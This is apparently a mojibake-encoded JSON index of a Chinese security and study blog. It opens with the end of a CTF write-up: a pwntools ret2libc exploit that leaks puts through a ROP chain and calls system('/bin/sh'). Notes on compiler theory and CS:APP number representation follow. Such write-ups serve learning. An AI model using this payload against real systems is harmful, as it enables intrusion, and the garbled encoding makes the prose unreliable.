elf.plt[&#x27;puts&#x27;] # putså‡½æ•°åœ°å€rdi_ret = 0x400c83 # putså‡½æ•°çš„å‚æ•° putså‡½æ•°çš„åœ°å€ putså‡½æ•°æ‰§è¡Œå®Œçš„è¿”å›åœ°å€ï¼Œç”¨äºä¸‹ä¸€æ¬¡çš„shellcodepayload1 = b&#x27;A&#x27; * 0x50 + p64(0) + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr)io.sendlineafter(b&#x27;Input your choice!&#x27;,b&#x27;1&#x27;)io.sendlineafter(b&#x27;Input your Plaintext to be encrypted&#x27;,payload1)io.recvuntil(b&#x27;Ciphertext\\n&#x27;)io.recvuntil(b&#x27;\\n&#x27;)# æ‹¿åˆ°putsåœ¨å†…å­˜ä¸­çš„åœ°å€puts_addr = u64(io.recvline().strip().ljust(8,b&#x27;\\0&#x27;))print(&#x27;addr:&#x27;,hex(puts_addr))# æ‰¾å†…å­˜libcçš„åœ°å€libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)addr_base = puts_addr - libc.dump(&quot;puts&quot;)print(&#x27;libc&#x27;,addr_base)sys_addr = libc.dump(&#x27;system&#x27;) + addr_basebinsh_addr = libc.dump(&#x27;str_bin_sh&#x27;) + addr_basepayload2 = b&#x27;A&#x27; * 0x50 + p64(0) + p64(rdi_ret) + p64(binsh_addr) + p64(sys_addr) + p64(encrypt_addr)io.sendlineafter(b&#x27;Input your Plaintext to be encrypted&#x27;,payload2)io.interactive() ç»“æœï¼š","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]},{"title":"ç¼–è¯‘2","slug":"ç¼–è¯‘å2","date":"2023-01-12T14:07:41.000Z","updated":"2023-01-14T12:49:16.099Z","comments":true,"path":"2023/01/12/ç¼–è¯‘å2/","link":"","permalink":"https://pa1r0t.github.io/2023/01/12/%E7%BC%96%E8%AF%91%E5%81%8F2/","excerpt":"é«˜çº§è¯­è¨€æè¿°","text":"é«˜çº§è¯­è¨€æè¿° ç¼–è¯‘åŸºç¡€çŸ¥è¯† é«˜çº§è¯­è¨€ï¼šç¨‹åºè¯­è¨€æ˜¯ä¸€ä¸ªè®°å·ç³»ç»Ÿ è¯­æ³• è¯­æ³•ä½¿å¾—è¿™ä¸²å­—ç¬¦å½¢æˆä¸€ä¸ªå½¢å¼ä¸Šæ­£ç¡®çš„ç¨‹åºã€‚ è¯­æ³•ï¼è¯æ³•è§„åˆ™ï¼‹è¯­æ³•è§„åˆ™ ä¾‹å¦‚ï¼š 0.5*x1+c * 0.5ã€x1ã€cã€+æ˜¯è¯­è¨€çš„å•è¯ç¬¦å· 0.5*x1+cæ˜¯è¯­è¨€çš„è¯­æ³•å•ä½ è¯­æ³•å•ä½ï¼šè¡¨è¾¾å¼ã€å­å¥ã€è¯­å¥ã€å‡½æ•°ã€è¿‡ç¨‹ã€ç¨‹åº è¯­è¨€çš„è¯æ³•è§„åˆ™å’Œè¯­æ³•è§„åˆ™å®šä¹‰äº†ç¨‹åºçš„å½¢ å¼ç»“æ„ï¼Œæ˜¯åˆ¤æ–­è¾“å…¥å­—ç¬¦ä¸²æ˜¯å¦æ„æˆä¸€ä¸ªå½¢ å¼ä¸Šæ­£ç¡®çš„ç¨‹åºçš„ä¾æ®ã€‚ è¯­ä¹‰ å­—æ¯è¡¨å’Œç¬¦å·è¡¨ä¸€äº›æ¦‚å¿µï¼š å­—æ¯è¡¨ï¼šæ˜¯ç¬¦å·çš„éç©ºæœ‰ç©·é›†åˆï¼Œæ˜¯ç¬¦å·çš„éç©ºæœ‰ç©·é›†åˆ ç¬¦å·ä¸²ï¼šé¡¾åæ€ä¹‰ã€‚ç©ºä¸²ï¼šä¸å«æœ‰ä»»ä½•ç¬¦å·çš„ä¸²ç§°ä½œç©ºä¸²ï¼Œè®°ä½œÎµ å¥å­ï¼šå­—æ¯è¡¨ä¸Šç¬¦åˆæŸç§è§„åˆ™æ„æˆçš„ä¸²ã€‚ä¸²å°±æ˜¯å¥å­ ï¼ˆæ³¨ï¼šçº¦å®šç”¨a,b,câ€¦è¡¨ç¤ºç¬¦å·ï¼›ç”¨Î±,Î²,Î³â€¦è¡¨ç¤ºç¬¦å·ä¸²ï¼› ç”¨A,B,Câ€¦è¡¨ç¤ºå…¶é›†åˆï¼‰ ç¬¦å·ä¸²é›†åˆçš„è¿ç®—ï¼š ç¬¦å·ä¸²é›†åˆçš„è¿ç®—ï¼š ä¾‹å¦‚ï¼šA&#x3D;{a,b}; B&#x3D;{c,e,d} åˆ™AB&#x3D;{ac,ae,ad,bc,be,bd} Aä¸­çš„å…ƒç´ å¿…é¡»åœ¨Bå…ƒç´ çš„å‰é¢ï¼Œå¦åˆ™æ˜¯é”™çš„ï¼Œè¿™ä¸ªé¡ºåºè¦æå¯¹ ä¾‹å¦‚ï¼šä¸²é›†Aï¼{a}çš„å„æ¬¡æ–¹å¹‚å®šä¹‰ä¸ºï¼š â€“ A0&#x3D;{Îµ} â€“ A1&#x3D;A&#x3D;{a} â€“ â€¦â€¦ â€“ An&#x3D;AAn-1(n&gt;0)&#x3D;{aâ€¦a} å­—æ¯è¡¨çš„é—­åŒ…ä¸æ­£é—­åŒ… å­—æ¯è¡¨Açš„é—­åŒ…ï¼ˆAï¼‰ï¼šA&#x3D;A0âˆªA1âˆªA2âˆªâ€¦ å³ï¼šç”±Aä¸Šç¬¦å·ç»„æˆçš„æ‰€æœ‰ä¸²çš„é›†åˆï¼ˆåŒ…æ‹¬ç©ºä¸² Îµ ï¼‰ å­—æ¯è¡¨Açš„æ­£é—­åŒ…ï¼ˆA+ï¼‰ï¼šA+&#x3D; A1 âˆªA2âˆª â€¦&#x3D;A*-{Îµ} å³ï¼šç”±Aä¸Šç¬¦å·ç»„æˆçš„æ‰€æœ‰ä¸²çš„é›†åˆï¼ˆä¸åŒ…æ‹¬ç©º ä¸²Îµ ï¼‰ å­—æ¯è¡¨ä¸Šè¯­è¨€ï¼šæ˜¯å­—æ¯è¡¨ä¸Šæ­£é—­åŒ…çš„å­é›† æ–‡æ³•ä¸è¯­è¨€çš„å…³ç³»æ–‡æ³•ï¼š å…¶è¯­æ³•è§„åˆ™å¦‚ä¸‹ï¼š â€“ &lt;å¥å­&gt;â†’&lt;ä¸»è¯­&gt;&lt;è°“è¯­&gt; â€“ &lt;ä¸»è¯­&gt; â†’&lt;å½¢å®¹è¯&gt;&lt;åè¯&gt; â€“ &lt;è°“è¯­&gt; â†’&lt;åŠ¨è¯&gt;&lt;å®¾è¯­&gt; â€“ &lt;å®¾è¯­&gt; â†’ &lt;å½¢å®¹è¯&gt;&lt;åè¯&gt; â€“ &lt;å½¢å®¹è¯&gt; â†’Young | pop â€“ &lt;åè¯&gt; â†’men | music â€“ &lt;åŠ¨è¯&gt; â†’like ç›¸å…³æ¦‚å¿µï¼š éç»ˆç»“ç¬¦ å‡ºç°åœ¨è§„åˆ™çš„å·¦éƒ¨ã€ç”¨&lt;&gt;æ‹¬èµ·æ¥ã€è¡¨ç¤ºä¸€å®š è¯­æ³•æ¦‚å¿µçš„è¯ éç»ˆç»“ç¬¦é›†åˆç”¨VNè¡¨ç¤ºã€‚ ç»ˆç»“ç¬¦ è¯­è¨€ä¸­ä¸å¯å†åˆ†å‰²çš„å­—ç¬¦ä¸²(åŒ…æ‹¬å•ä¸ªå­—ç¬¦ ç»„æˆçš„ä¸²)ã€‚æ³¨ï¼šç»ˆç»“ç¬¦æ˜¯ç»„æˆå¥å­çš„åŸºæœ¬å•ä½ ç»ˆç»“ç¬¦é›†åˆç”¨VTè¡¨ç¤ºã€‚ å¼€å§‹ç¬¦å·","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"csapp1","slug":"csapp1","date":"2023-01-09T06:30:39.000Z","updated":"2023-01-17T07:43:40.272Z","comments":true,"path":"2023/01/09/csapp1/","link":"","permalink":"https://pa1r0t.github.io/2023/01/09/csapp1/","excerpt":"å­¦ä¹ ä¸€ä¸‹csapp,ç¬¬ä¸€ç¯‡","text":"å­¦ä¹ ä¸€ä¸‹csapp,ç¬¬ä¸€ç¯‡ åœ¨32ä½ç³»ç»Ÿï¼š-2147483648 &lt; 2147483647 ç»“æœä¸ºfalse â€‹ int i &#x3D; -2147483648; i &lt; 2147483647 ç»“æœä¸ºtrue â€‹ -2147483648-1 &lt; 2147483647 ç»“æœä¸ºtrue åœ¨è®¡ç®—æœºä¸­è¿ç®—æ˜¯ä¼šå‘ç”Ÿæº¢å‡ºï¼Œå‡å¦‚è¿ç®—åçš„æ•°è¶…è¿‡äº†32ä½ï¼Œé‚£æœ€ç»ˆç»“æœå¯èƒ½æ˜¯ä¸€ä¸ªè´Ÿæ•°ï¼Œæˆ–è€…æ˜¯å…¶ä»–æ­£æ•´æ•° æˆ‘ä»¬ç”¨linuxä¸­çš„gdbè½¯ä»¶æ¥è¯æ˜å…¶ä¸­çš„ç»“è®º å¾ˆæ˜¾ç„¶ï¼Œä¸Šè¿°è¶…ä¹æˆ‘ä»¬çš„é¢„æƒ³ ç„¶è€Œåœ¨æ•´æ•°è¿ç®—æ—¶æ˜¯ç¬¦åˆäº¤æ¢å¾‹çš„ï¼Œä½†æ˜¯åœ¨è®¡ç®—æœºä¸­æµ®ç‚¹æ•°å´ä¸ç¬¦åˆäº¤æ¢å¾‹ è¿™é‡Œåšä¸€ä¸ªå®éªŒï¼šç”¨(1e20 + -1e20) + 3.14 ç»“æœä¸ºï¼š3.1400000000000001 å†ç”¨1e20 + (-1e20 + 3.14)ï¼Œè¿™é‡Œ3.14å¯¹äº-1e20å¾®ä¸è¶³é“ ç»“æœä¸ºï¼š0 ä»–ä»¬ç”¨æœ‰é™çš„ä½ç»„åˆå½¢å¼è¡¨ç¤ºåœ¨æ•°åŸŸä¸­æ— çº¿æ‰©å¼ çš„æ•° å®šç‚¹æ•°å’Œæµ®ç‚¹æ•°è®¡ç®—æœºä¸­åªèƒ½é€šè¿‡çº¦å®šå°æ•°ç‚¹çš„ä½ç½®æ¥è¡¨ç¤º å°æ•°ç‚¹ä½ç½®çº¦å®šåœ¨å›ºå®šä½ç½®çš„æ•°ç§°ä¸ºå®šç‚¹æ•° å°æ•°ç‚¹ä½ç½®çº¦å®šä¸ºå¯æµ®åŠ¨çš„æ•°ç§°ä¸ºæµ®ç‚¹æ•° å®šç‚¹å°æ•°ç”¨æ¥è¡¨ç¤ºæµ®ç‚¹æ•°çš„å°¾æ•°éƒ¨åˆ† ä»»ä½•å®æ•°ï¼šX&#x3D;(-1)^s^ Ã—MÃ—R^E^ å…¶ä¸­ï¼ŒSå–å€¼ä¸º0æˆ–1ï¼Œç”¨æ¥å†³å®šæ•°Xçš„ç¬¦å·ï¼›Mæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶å®šç‚¹å°æ•° ï¼Œç§°ä¸ºæ•°Xçš„å°¾æ•°ï¼ˆmantissaï¼‰ï¼›Eæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶å®šç‚¹æ•´æ•°ï¼Œç§°ä¸ºæ•°X çš„é˜¶æˆ–æŒ‡æ•°ï¼ˆexponentï¼‰ï¼›Ræ˜¯åŸºæ•°ï¼ˆradixã€baseï¼‰ï¼Œå¯ä»¥ä¸º2ã€4å’Œ16ç­‰,è®¡ç®—æœºä¸­åªè¦è¡¨ç¤ºSã€Må’ŒEä¸‰ä¸ªä¿¡æ¯ï¼Œå°±èƒ½ç¡®å®šXçš„å€¼ï¼Œå«æµ®ç‚¹æ•° å®šç‚¹æ•°çš„ç¼–ç è¡¨ç¤ºæµ®ç‚¹æ•°ï¼ˆå¯ç”¨ä¸€ä¸ªå®šç‚¹å°æ•°å’Œä¸€ä¸ªå®šç‚¹æ•´æ•°æ¥è¡¨ç¤ºï¼‰ å®šç‚¹æ•°çš„ç¼–ç ï¼ˆè§£å†³æ­£è´Ÿå·é—®é¢˜ï¼‰: åŸç ã€è¡¥ç ã€ç§»ç ã€åç  ï¼ˆå¾ˆå°‘ç”¨ï¼‰ åŸç è¡¨ç¤ºï¼š å…¶ä¸­ç”±ä¸Šå›¾å¾—0æœ‰ä¸¤ç§è¡¨ç¤ºï¼Œä¸å”¯ä¸€ åŠ å‡æ–¹å¼ï¼Œå¯¹äºåŒå·ï¼Œå–ç»å¯¹å€¼ç›¸åŠ ï¼Œç„¶ååœ¨åŠ ä¸Šç¬¦å·ï¼Œå¯¹äºå¼‚å·ï¼Œæ˜¯æ¯”è¾ƒå“ªä¸ªç»å¯¹å€¼å¤§ï¼Œç„¶åå¤§çš„é—´å°çš„ï¼Œç„¶åå†åŠ ä¸Šç»å¯¹å€¼å¤§çš„ç¬¦å·ã€‚è¿™æ ·åŠ å‡æ–¹å¼ç¹çä¸ç»Ÿä¸€ &#x3D;&#x3D;ä» 50å¹´ä»£å¼€å§‹ï¼Œæ•´æ•°éƒ½é‡‡ç”¨è¡¥ç æ¥è¡¨ç¤º ä½†æµ®ç‚¹æ•°çš„å°¾æ•°ç”¨åŸç å®šç‚¹å°æ•°è¡¨ç¤º&#x3D;&#x3D; è¡¥ç  - æ¨¡è¿ç®—ï¼ˆmodularè¿ç®—ï¼‰åœ¨ä¸€ä¸ªæ¨¡è¿ç®—ç³»ç»Ÿä¸­ï¼Œä¸€ä¸ªæ•°ä¸å®ƒé™¤ä»¥â€œæ¨¡â€åçš„ä½™æ•°ç­‰ä»· ä¸€ä¸ªè´Ÿæ•°çš„è¡¥ç ç­‰äºæ¨¡å‡è¯¥è´Ÿæ•°çš„ç»å¯¹å€¼ å¯¹äºæŸä¸€ç¡®å®šçš„æ¨¡ï¼ŒæŸæ•°å‡å»å°äºæ¨¡çš„å¦ä¸€æ•°ï¼Œæ€»å¯ ä»¥ç”¨è¯¥æ•°åŠ ä¸Šå¦ä¸€æ•°è´Ÿæ•°çš„è¡¥ç æ¥ä»£æ›¿ è¡¥ç ï¼ˆmodularè¿ç®—ï¼‰ï¼š+ å’Œâ€“ çš„ç»Ÿä¸€ ä¾‹1ï¼šâ€œé’Ÿè¡¨â€æ¨¡è¿ç®—ç³»ç»Ÿ å‡å®šæ—¶é’ˆåªèƒ½é¡ºæ‹¨ï¼Œä»10ç‚¹å€’æ‹¨4æ ¼åæ˜¯å‡ ç‚¹ï¼Ÿ 10- 4 &#x3D; 10+(12- 4) &#x3D; 10+8 &#x3D; 6ï¼ˆmod 12ï¼‰ ç»“è®ºï¼šä¸€ä¸ªè´Ÿæ•°çš„è¡¥ç ç­‰äºå°†å¯¹åº”æ­£æ•°è¡¥ç  å„ä½å–åã€æœ«ä½åŠ ä¸€è¡¥ç çš„å®šä¹‰ å‡å®šè¡¥ç æœ‰nä½ï¼Œåˆ™ï¼š[X]è¡¥&#x3D; 2n + X ï¼ˆ-2n-1â‰¤Xï¼œ2n-1 ï¼Œmod 2nï¼‰ Xæ˜¯çœŸå€¼ï¼Œ[x]è¡¥æ˜¯æœºå™¨æ•° æ±‚ç‰¹æ®Šæ•°çš„è¡¥ç å‡å®šæœºå™¨æ•°æœ‰nä½ï¼š â‘  [-2^n-1^]è¡¥&#x3D; 2^n^ - 2^n-1^ &#x3D; 10â€¦0ï¼ˆn-1ä¸ª0ï¼‰ ï¼ˆmod 2^n^ï¼‰ â‘¡ [-1]è¡¥&#x3D; 2^n^ - 0â€¦01 &#x3D; 11â€¦1ï¼ˆnä¸ª1ï¼‰ ï¼ˆmod 2^n^) â‘¢ [+0]è¡¥&#x3D; [-0]è¡¥&#x3D; 00â€¦0ï¼ˆnä¸ª0ï¼‰ å˜å½¢è¡¥ç çš„è¡¨ç¤ºå˜å½¢ï¼ˆ4â€™sï¼‰è¡¥ç ï¼šåŒç¬¦å·ï¼Œç”¨äºå­˜æ”¾å¯èƒ½æº¢å‡ºçš„ä¸­é—´ç»“æœ æ±‚çœŸå€¼çš„è¡¥ç : ç®€ä¾¿æ–¹æ³•ï¼šä»å³å‘å·¦é‡åˆ°ç¬¬ä¸€ä¸ª1çš„å‰é¢å„ä½å–å æ±‚è¡¥ç çš„çœŸå€¼: ç®€ä¾¿æ±‚æ³•ï¼š ç¬¦å·ä¸º0ï¼Œåˆ™ä¸ºæ­£æ•°ï¼Œæ•°å€¼éƒ¨åˆ†ç›¸åŒ ç¬¦å·ä¸º1ï¼Œåˆ™ä¸ºè´Ÿæ•°ï¼Œæ•°å€¼å„ä½å–åï¼Œæœ«ä½åŠ 1 ç§»ç è¡¨ç¤ºExcess ä»€ä¹ˆæ˜¯ç§»ç è¡¨ç¤ºï¼Ÿ å°†æ¯ä¸€ä¸ªæ•°å€¼åŠ ä¸Šä¸€ä¸ªåç½®å¸¸æ•°ï¼ˆ Excess &#x2F; biasï¼‰ é€šå¸¸ï¼Œå½“ç¼–ç ä½æ•°ä¸ºnæ—¶ï¼Œbiaså– 2^n-1^ æˆ– 2^n-1^-1ï¼ˆå¦‚ IEEE 754) ä¸ºä»€ä¹ˆè¦ç”¨ç§»ç æ¥è¡¨ç¤ºæŒ‡æ•°ï¼ˆé˜¶ç ï¼‰? ä¾¿äºæµ®ç‚¹æ•°åŠ å‡è¿ç®—æ—¶çš„å¯¹é˜¶æ“ä½œï¼ˆæ¯”è¾ƒå¤§å°ï¼‰ å¸¦ç¬¦å·æ•´æ•°æœ‰ä¸‰ç§å®šç‚¹ç¼–ç æ–¹å¼ï¼š Signed and magnitude ï¼ˆåŸç ï¼‰ï¼šå®šç‚¹å°æ•°ï¼Œç”¨æ¥è¡¨ç¤ºæµ®ç‚¹æ•°çš„å°¾æ•° Excess (biased) notion ï¼ˆç§»ç ï¼‰ï¼šå®šç‚¹æ•´æ•°ï¼Œç”¨äºè¡¨ç¤ºæµ®ç‚¹æ•°çš„é˜¶ï¼ˆæŒ‡æ•°ï¼‰ Twoâ€™s complement ï¼ˆè¡¥ç ï¼‰ï¼š50å¹´ä»£ä»¥æ¥ï¼Œæ‰€æœ‰è®¡ç®—æœºéƒ½ç”¨è¡¥ç æ¥è¡¨ç¤ºå¸¦ç¬¦å·æ•´æ•° ä¸ºä»€ä¹ˆç”¨è¡¥ç è¡¨ç¤ºå¸¦ç¬¦å·æ•´æ•°ï¼Ÿ è¡¥ç è¿ç®—ç³»ç»Ÿæ˜¯æ¨¡è¿ç®—ç³»ç»Ÿï¼ŒåŠ ã€å‡è¿ç®—ç»Ÿä¸€ æ•°0çš„è¡¨ç¤ºå”¯ä¸€ï¼Œæ–¹ä¾¿ä½¿ç”¨ æ¯”åŸç å¤šè¡¨ç¤ºä¸€ä¸ªæœ€å°è´Ÿæ•° æ— ç¬¦å·æ•°:å¸¸åœ¨ä¸€ä¸ªæ•°çš„åé¢åŠ ä¸€ä¸ªâ€œuâ€æˆ–â€œUâ€è¡¨ç¤ºæ— ç¬¦å·æ•° &#x3D;&#x3D;è‹¥åŒæ—¶æœ‰æ— ç¬¦å·å’Œå¸¦ç¬¦å·æ•´æ•°ï¼Œåˆ™Cç¼–è¯‘å™¨å°†å¸¦ç¬¦å·æ•´æ•°å¼ºåˆ¶è½¬æ¢ä¸ºæ— ç¬¦å·æ•°&#x3D;&#x3D; å¸¦*çš„ä¸é¢„æƒ³çš„ä¸åŒ ç¼–è¯‘å™¨å¤„ç†å¸¸é‡æ—¶é»˜è®¤çš„ç±»å‹ Cè¡¨è¾¾å¼-2147483648 &lt; 2147483647çš„æ‰§è¡Œç»“ æœä¸ºfalseï¼Œè¿™æ˜¯å› ä¸ºç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ—¶ï¼Œæ˜¯æŠŠç¬¦å·å’Œå­—é¢é‡åˆ†å¼€è¯†åˆ«ï¼Œå…ˆè¯†åˆ«å­—é¢é‡2147483648ï¼Œ2147483648åœ¨C90ä¸­æ—¶2^31^,å±äºunsigned intï¼Œæ‰€ä»¥æ­¤æ¬¡æ¯”è¾ƒæ˜¯æ ¹æ®æ— ç¬¦å·æ•°æ¥è¿›è¡Œæ¯”è¾ƒã€‚ è‹¥å®šä¹‰å˜é‡â€œint i&#x3D;-2147483648;â€ï¼Œåˆ™â€œi &lt; 2147483647â€çš„æ‰§è¡Œ ç»“æœä¸ºtrueï¼Œè¿™ä¸ªä¸ç”¨è§£é‡Šï¼Œintç±»å‹å·²ç»å®šä¹‰å¥½ç±»å‹äº†ï¼Œä¸éœ€è¦å†åˆ¤åˆ« å¦‚æœå°†è¡¨è¾¾å¼å†™æˆâ€œ-2147483647-1 &lt; 2147483647â€ï¼Œåˆ™ç»“æœä¼šæ€ æ ·å‘¢ï¼Ÿæ˜¯true ä¸è¿‡C99çš„æ ‡å‡†ä¸ä¸€æ ·ï¼Œçœ‹ä¸Šé¢çš„è¡¨å°±çŸ¥é“","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"ç¼–è¯‘ç¯‡1","slug":"ç¼–è¯‘ç¯‡1","date":"2023-01-09T02:16:11.000Z","updated":"2023-01-14T11:28:58.372Z","comments":true,"path":"2023/01/09/ç¼–è¯‘ç¯‡1/","link":"","permalink":"https://pa1r0t.github.io/2023/01/09/%E7%BC%96%E8%AF%91%E7%AF%871/","excerpt":"å¼•è®ºå­¦ä¹ ","text":"å¼•è®ºå­¦ä¹  ç¨‹åºè®¾è®¡è¯­è¨€çš„è½¬æ¢ ç¼–è¯‘ï¼šä»é«˜çº§è¯­è¨€åˆ°ä½çº§è¯­è¨€çš„è¿‡ç¨‹ è§£é‡Šï¼šæ¥å—é«˜çº§è¯­è¨€çš„ä¸€æ¡è¯­å¥è¾“å…¥ï¼Œè¿›è¡Œè§£é‡Šå¹¶æ§åˆ¶è®¡ç®—æœºæ‰§è¡Œï¼Œé©¬ä¸Šè·å¾—è¯¥è¯­å¥çš„æ‰§è¡Œç»“æœï¼Œç„¶åæ¥å—ä¸‹ä¸€æ¡è¯­å¥ ä¼˜ç‚¹ï¼šå®ç°äººæœºäº¤äº’ ç¼ºç‚¹ï¼šæ•ˆç‡å·®ï¼Œæ¯æ¬¡éƒ½è¦è§£é‡Šï¼Œè€Œä¸åƒç¼–è¯‘ä¸€æ ·ï¼Œåªéœ€ç¼–è¯‘ä¸€æ¬¡ï¼Œä»¥ååªéœ€æ‰§è¡Œå³å¯ ç¼–è¯‘çš„è½¬æ¢è¿‡ç¨‹ï¼š ä¸¤é˜¶æ®µè½¬æ¢ï¼šç¼–è¯‘ä¸€ä¸€æ‰§è¡Œ ä¸‰ä¸ªé˜¶æ®µçš„è½¬æ¢ï¼šç¼–è¯‘ä¸€ä¸€æ±‡ç¼–ä¸€ä¸€è¿è¡Œ ç¼–è¯‘ç¨‹åºæ¦‚è¿°è‡ªç„¶è¯­è¨€çš„ç¿»è¯‘ï¼š è¯†åˆ«å¥å­ä¸­ä¸€ä¸ªä¸ªå•è¯ åˆ†æå¥å­çš„è¯­æ³•ç»“æ„ æ ¹æ®å¥å­çš„å«ä¹‰è¿›è¡Œåˆæ­¥ç¿»è¯‘ å¯¹è¯‘æ–‡è¿›è¡Œä¿®é¥° å†™å‡ºæœ€åè¯‘æ–‡ ç¼–è¯‘ç¨‹åºçš„å·¥ä½œï¼š è¯æ³•åˆ†æ è¯­æ³•åˆ†æ è¯­ä¹‰åˆ†æå’Œä¸­é—´ä»£ç çš„ç”Ÿæˆ ä¼˜åŒ– ç›®æ ‡ä»£ç çš„ç”Ÿæˆ è¯æ³•åˆ†æï¼š ä»»åŠ¡ï¼šå¯¹æºç¨‹åºçš„å­—ç¬¦ä¸²è¿›è¡Œæ‰«æå’Œåˆ†è§£ï¼Œè¯†åˆ«å‡ºä¸€ä¸ªä¸ªå•è¯ åŸºæœ¬å­—ï¼švoid,int,float æ ‡è¯†ç¬¦ï¼ša,b,c,d é•¿æ•´æ•°ï¼š50 è¿ç®—ç¬¦ï¼š+ï¼Œ-ï¼Œ*ï¼Œ&#x3D; ç•Œé™ç¬¦ï¼š{}ï¼Œï¼›ï¼ˆï¼‰ è¯æ³•åˆ†æä¾ç…§è¯æ³•è§„åˆ™ï¼Œè¯†åˆ«å‡ºæ­£ç¡®çš„å•è¯ï¼Œè½¬æ¢æˆç»Ÿä¸€è§„æ ¼ï¼Œå¤‡ç”¨ è½¬æ¢ï¼š å¯¹åŸºæœ¬å­—ã€è¿ç®—ç¬¦ã€ç•Œé™ç¬¦çš„è½¬æ¢ æ ‡è¯†ç¬¦çš„è½¬æ¢ å¸¸æ•°çš„è½¬æ¢ è½¬æ¢å®Œæˆçš„æ ¼å¼ï¼ˆç±»å·ã€å†…ç ï¼‰ æè¿°è¯æ³•è§„åˆ™çš„æœ‰æ•ˆå·¥å…·æ˜¯æ­£è§„å¼å’Œæœ‰é™è‡ªåŠ¨æœº è¯­æ³•åˆ†æï¼š ä»»åŠ¡ï¼šè¯æ³•åˆ†æåçš„å•è¯ï¼Œæ ¹æ®è¯­è¨€çš„è¯­æ³•è§„åˆ™ï¼ŒæŠŠå•è¯ç¬¦å·ç»„æˆå„ç±»è¯­æ³•å•ä½ï¼šå­å¥ã€è¯­å¥ è¯­æ³•è§„åˆ™ï¼šè§„å®šå•è¯å¦‚ä½•ç»„æˆå¥ï¼Œç§°ä¸ºæ–‡æ³• è¯­æ³•è§„åˆ™çš„è¡¨ç¤ºï¼š BNF: A::&#x3D;B|C è¡¨ç¤ºAå®šä¹‰ä¸ºBæˆ–C è¯­æ³•åˆ†æçš„æ–¹æ³•ï¼šæ¨å¯¼å’Œè§„çº¦ æ¨å¯¼ï¼šæœ€å·¦æ¨å¯¼å’Œæœ€å³æ¨å¯¼ è§„çº¦ï¼šæœ€å³è§„çº¦å’Œæœ€å·¦è§„çº¦ èµ‹å€¼è¯­å¥çš„è¯­æ³•è§„åˆ™ï¼š A::&#x3D;V&#x3D;E E::&#x3D;T|E+T T::&#x3D;F|T*F F::&#x3D;V|(E)|C V::&#x3D;æ ‡è¯†ç¬¦ C::&#x3D;å¸¸æ•° ä¾‹é¢˜ï¼šâ€‹ x &#x3D; a + b*50 æ ¹æ®ä¸Šé¢çš„æ–‡æ³•è§„åˆ™è¿ç”¨æœ€å³æ¨å¯¼ï¼šæœ€å³æ¨å¯¼å°±æ˜¯æ¯æ¬¡åªå˜æ¢æœ€å³çš„å­—æ¯ A&#x3D;&gt;V&#x3D;E &#x3D;&gt; V&#x3D;E+T &#x3D;&gt; V&#x3D;E+T*F &#x3D;&gt; T&#x3D;E+T*C &#x3D;&gt; T&#x3D;E+T*50 &#x3D;&gt; T&#x3D;E+F*50 &#x3D;&gt; T&#x3D;E+V*50 &#x3D;&gt; T&#x3D;E+b*50 &#x3D;&gt; T&#x3D;T+b*50 &#x3D;&gt; T&#x3D;V+b*50 &#x3D;&gt; T&#x3D;a+b*50 å¦‚ä½•æœ€å·¦è§„çº¦ï¼Œå°±æ˜¯ä»T&#x3D;a+b*50å˜æ¢åˆ°A,ä¹Ÿå°±æ˜¯èµ‹å€¼è¿ç®—æˆç«‹ï¼Œæ¯æ¬¡åªå˜æ¢æœ€å·¦è¾¹çš„å­—æ¯ï¼Œæ˜¯æœ€å³æ¨å¯¼çš„é€†è¿ç®— è®¡ç®—æœºæ˜¯ç”¨è¯­æ³•æ ‘æ¥æ£€éªŒè¯­æ³•ï¼š ä¸­é—´ä»£ç ç”Ÿæˆ ä»»åŠ¡ï¼šæ ¹æ®è¯­æ³•åˆ†æå…¶ä¸­çš„å«ä¹‰ï¼Œè¿›è¡Œåˆæ­¥ç¿»è¯‘ï¼Œäº§ç”Ÿä»‹äºæºä»£ç å’Œç›®æ ‡ä»£ç ä¹‹é—´çš„ä¸€ç§ä»£ç  åˆ†ä¸ºä¸¤é˜¶æ®µçš„å·¥ä½œï¼š å¯¹æ¯ç§è¯­æ³•èŒƒç•´è¿›è¡Œé™æ€è¯­ä¹‰æ£€æŸ¥ å¦‚æœè¯­ä¹‰æ­£ç¡®ï¼Œå°±è¿›è¡Œä¸­é—´ä»£ç çš„ç¿»è¯‘ ä¸­é—´ä»£ç å½¢å¼ï¼šå››å…ƒå¼ã€ä¸‰å…ƒå¼ã€é€†æ³¢å…°å¼ å°†x&#x3D;a+b*50å˜æˆä¸­é—´ä»£ç ï¼š åºå· ç®—ç¬¦ å·¦æ“ä½œæ•° å³æ“ä½œæ•° ç»“æœ ï¼ˆ1ï¼‰ å°†æ•´å¸¸æ•°50è½¬æ¢ä¸ºå®å¸¸æ•° T1 ï¼ˆ2ï¼‰ * b T1 T2 ï¼ˆ3ï¼‰ + a T2 T3 ï¼ˆ4ï¼‰ &#x3D; T3 x ä»¥ä¸Šå°±æ˜¯å››å…ƒå¼ ä¼˜åŒ– å¯¹ä¸­é—´ä»£ç è¿›è¡ŒåŠ å·¥å˜æ¢ï¼Œå˜æ¢å‡ºæ•ˆç‡æ›´é«˜çš„ä»£ç  åŸåˆ™ï¼šç­‰ä»·å˜æ¢ï¼Œåœ¨ä¸æ”¹å˜åŸæ„çš„æƒ…å†µä¸‹ ä¸»è¦æ–¹é¢ï¼š å…¬å…±å­è¡¨è¾¾å¼çš„æå–ï¼šx&#x3D;(a+b)*c+(a+b)*d åˆå¹¶å·²çŸ¥é‡ï¼šc&#x3D;a+b d &#x3D; a+b æœªæ”¹å˜aï¼Œbçš„å€¼ åˆ é™¤æ— ç”¨è¯­å¥ï¼šä¸€äº›æ³¨é‡Šæˆ–è€…ä¸€äº›ä¸ç¨‹åºæœ¬èº«æ— å…³çš„è¡¨è¾¾å¼ å¾ªç¯ä¼˜åŒ– ä¾‹å¦‚å°†ä»¥ä¸‹è¯­å¥è½¬æˆä¸­é—´ä»£ç ï¼š 1234for( k = 1; k &lt;= 100; k++)&#123; m = i + 10*k; n = j + 10*k;&#125; 